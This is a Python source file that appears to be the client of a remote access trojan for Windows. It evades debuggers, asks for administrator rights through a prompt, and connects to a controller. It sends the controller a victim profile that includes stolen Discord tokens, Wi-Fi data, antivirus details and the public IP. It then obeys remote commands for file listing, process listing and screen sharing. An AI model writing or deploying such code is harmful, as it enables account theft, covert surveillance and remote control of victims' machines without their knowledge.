import socket
import json
import platform
import requests
import time
import uuid
import psutil
import os
import ctypes
import wmi
import sys

from modules import screenshare, antivirus, discord, antidb, wifi
from constants import path
from utils import disk as disk_util


class Client:
    def __init__(self) -> None:
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect(('localhost', 8080))

        self.send(json.dumps({
            # System
            "computer_name": platform.node(),
            "computer_os": platform.system(),
            "computer_version": platform.version(),
            "total_memory": psutil.virtual_memory().total,
            "up_time": time.strftime("%H:%M:%S", time.gmtime(psutil.boot_time())),
            "uuid": str(uuid.UUID(int=uuid.getnode())),
            "cpu": platform.processor(),
            "gpu": wmi.WMI().Win32_VideoController()[0].Name,
            "uac": ctypes.windll.shell32.IsUserAnAdmin() == 1,
            "anti_virus": json.dumps(antivirus.get_antivirus_info()),

            # Network
            "ip": requests.get("https://api.ipify.org").text,
            "client_ip": self.client.getsockname()[0],
            "country": requests.get("https://ipapi.co/country_name").text,
            "timezone": time.tzname[0],

            # Disks
            "disks": "\n".join([f"{disk.device}: {disk.mountpoint} - ({disk.fstype} / {disk_util.get_file_system_description(disk.fstype)})" for disk in psutil.disk_partitions()]),

            # Network Interfaces
            "wifi": wifi.get_wifi(),

            # Apps
            "webbrowsers": path.get_installed_browsers(),
            "discord_tokens": discord.get_discord_tokens(),
        }))

        self.lifetime()

    def send(self, data: str) -> None:
        """ Handle large data by splitting it into chunks """
        chunk_size = 1024
        for i in range(0, len(data), chunk_size):
            self.client.sendall(data[i:i+chunk_size].encode('utf-8'))
        self.client.sendall(b'END_OF_MESSAGE')

    def receive(self) -> str:
        chunks = []
        while True:
            chunk = self.client.recv(8192)
            if b'END_OF_MESSAGE' in chunk:
                chunks.append(chunk.replace(b'END_OF_MESSAGE', b'').decode('utf-8'))
                break
            chunks.append(chunk.decode('utf-8'))
        return ''.join(chunks)

    def lifetime(self) -> None:
        try:
            while True:
                data = self.receive()
                if not data:
                    break

                try:
                    data = json.loads(data)
                    command = data["command"]

                    match command:
                        case "ls":
                            files = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isfile(os.path.join(os.path.expanduser("~"), f))]
                            folders = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isdir(os.path.join(os.path.expanduser("~"), f))]
                            self.send(json.dumps({
                                "command": "ls",
                                "files": files,
                                "folders": folders,
                            }))
                        case "exit":
                            self.close()
                            break
                        case "process":
                            processes = []
                            for process in psutil.process_iter():
                                try:
                                    process_info = {
                                    "name": process.name(),
                                    "pid": process.pid,
                                    "memory_percent": process.memory_percent(),
                                    "cpu_percent": process.cpu_percent()
                                    }
                                    processes.append(process_info)
                                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                    pass
                            self.send(json.dumps({
                                "command": "process",
                                "processes": processes
                            }))
                        case "enableUac":
                            if not ctypes.windll.shell32.IsUserAnAdmin():
                                try:
                                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                                    self.close()
                                    sys.exit(0)
                                except Exception as e:
                                    self.send(json.dumps({
                                        "command": "error",
                                        "message": f"Failed to enable UAC: {str(e)}"
                                    }).encode('utf-8'))
                            else:
                                self.send(json.dumps({
                                    "command": "error",
                                    "message": "UAC is already enabled"
                                }).encode('utf-8'))
                        case "ss":
                            screenshare.screenshare(self.send)
                        case _:
                            pass
                except json.JSONDecodeError as e:
                    print(f"JSON decode error: {e}")
        except Exception as e:
            print(f"Error: {e}")
            self.close()

    def close(self) -> None:
        self.client.close()

def main() -> None:
    # Anti debugging
    antidb.AntiDebug()

    if not ctypes.windll.shell32.IsUserAnAdmin():
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        if result > 32:
            sys.exit(0)
        else:
            pass

    client = Client()

if __name__ == "__main__":
    main()
